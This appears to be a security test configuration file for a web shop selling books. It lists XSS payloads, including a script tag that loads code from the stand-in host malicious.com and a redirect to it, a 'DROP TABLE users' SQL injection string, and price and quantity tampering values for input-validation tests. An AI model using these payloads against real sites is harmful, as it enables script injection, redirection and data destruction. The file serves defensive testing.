export const SECURITY_CONFIG = {
  XSS_TEST_DATA: {
    PAYLOADS: {
      SCRIPT: [
        '<script>alert("xss")</script>',
        '<script src="http://malicious.com/xss.js"></script>',
        '"><script>alert("xss")</script>',
      ],
      EVENT_HANDLERS: [
        '<img src="x" onerror="alert(\'xss\')">',
        '<svg onload="alert(\'xss\')">',
        '<body onload="alert(\'xss\')">',
      ],
      JAVASCRIPT_URLS: [
        'javascript:alert("xss")',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=',
      ],
      HTML_INJECTION: [
        '<style>body { background: red; }</style>',
        '<iframe src="javascript:alert(\'xss\')">',
        '<link rel="stylesheet" href="malicious.css">',
        '<meta http-equiv="refresh" content="0; url=http://malicious.com">',
      ],
    },
    MAX_LENGTH: {
      STORY_RESPONSE: 5000,
      NAME: 100,
      MESSAGE: 1000,
    },
  },
  PAYMENT_TEST_DATA: {
    INVALID_PROMO_CODES: [
      'INVALID_CODE',
      'EXPIRED_CODE',
      'TEST_CODE_123',
      '<script>alert(1)</script>',
      '"; DROP TABLE users; --',
    ],
    PRICE_POINTS: {
      SINGLE_BOOK: 149.99,
      ADDITIONAL_COPY: 99.99,
    },
    TAMPERING_TESTS: {
      QUANTITIES: [-1, 0, 999999],
      PRICES: [0, -1, 9.99],
    },
  },
  PRIVACY_TEST_DATA: {
    COOKIE_TYPES: {
      ESSENTIAL: 'essential',
      ANALYTICS: 'analytics',
      MARKETING: 'marketing',
    },
    PRIVACY_SETTINGS: {
      PUBLIC_PROFILE: false,
      SHARE_STORIES: false,
      MARKETING_EMAILS: false,
    },
    DATA_EXPORT_TYPES: [
      'stories',
      'personal_info',
      'payment_history',
    ],
  },
};
